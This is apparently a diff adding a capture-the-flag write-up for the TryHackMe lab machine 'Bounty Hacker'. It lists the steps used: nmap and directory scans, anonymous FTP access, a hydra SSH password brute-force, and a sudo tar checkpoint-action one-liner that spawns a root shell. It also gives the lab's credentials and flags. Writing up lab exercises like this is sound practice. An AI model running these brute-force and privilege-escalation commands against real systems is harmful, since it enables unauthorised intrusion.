@@ -1,0 +1,89 @@
+-->> Machine: Bounty Hacker
+
+-->> IP: 10.49.135.87
+
+
+-->> Commands:
+
+1> nmap -Pn -p- -sV -sC -O -T4 -A  10.49.135.87
+
+2> gobuster dir -u http://10.49.135.87 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+3> dirb http://10.49.135.87
+
+4> ftp 10.49.135.87
+
+5> sudo hydra -l lin -P plist.txt ssh://10.49.135.87
+
+6> ssh lin@10.49.135.87
+
+7>sudo -l  (inside shell)
+
+8> sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh    (inside shell)
+
+9> find / -name "root.txt" 2>/dev/null     (inside root shell)
+
+
+-->> Outputs:
+
+1> 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+   22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+   21/tcp open  ftp     vsftpd 3.0.5
+   | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+
+-->> Steps:
+
+1> Begin by scanning ports and services by nmap
+
+2> then bruteforce directories using gobuster and dirb
+
+3> then loged in ftp by Anonymous ( nmap result: ftp-anon: Anonymous FTP login allowed (FTP code 230))
+
+4> inside ftp found out two files  name- task.txt(message written by lin), locks.txt (it is a password list)
+
+5> then bruteforce for user lin with the password list we found using hydra tool
+
+6> then login using found Credentials
+
+7> found out user.txt -> got flag- THM{CR1M3_SyNd1C4T3}
+
+8> i unable to run commands as a root so i ran {sudo -l} to find out which commands i can ran as a root
+   - found out i can use tar as a root- (root) /bin/tar
+
+9> then search for tar in gtfobins
+
+10> found command used to break out from restricted environments by spawning an interactive system shell.
+    -tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+11> ran this inside and got a root access!
+
+12> then find out root.txt using find command
+
+13> and got a flag inside root.txt - THM{80UN7Y_h4cK3r}
+
+
+-->> Credentials: lin:RedDr4gonSynd1cat3
+
+
+-->> Found out:
+
+1> Apache/2.4.41 (Ubuntu) Server at 10.49.135.87 Port 80    -{ found at source code of /images
+
+2> [22][ssh] host: 10.49.135.87   login: lin   password: RedDr4gonSynd1cat3
+
+
+-->> Flags:
+
+1> THM{CR1M3_SyNd1C4T3}
+
+2> THM{80UN7Y_h4cK3r}
+
+
+
+
+
+
+
+
+
